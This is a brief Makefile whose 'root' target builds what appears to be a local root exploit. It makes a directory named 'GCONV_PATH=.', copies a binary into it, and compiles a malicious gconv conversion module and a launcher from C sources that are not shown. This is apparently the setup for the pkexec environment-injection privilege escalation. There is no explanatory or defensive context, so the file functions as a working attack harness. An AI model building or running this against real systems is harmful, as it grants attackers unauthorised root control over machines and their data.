all: root

root:
	mkdir 'GCONV_PATH=.'
	cp root 'GCONV_PATH=.'
	chmod +x GCONV_PATH=.\/root
	mkdir root
	gcc -shared -fPIC -o root/conversion-mod.so conversion-mod.c
	gcc -o root root.c
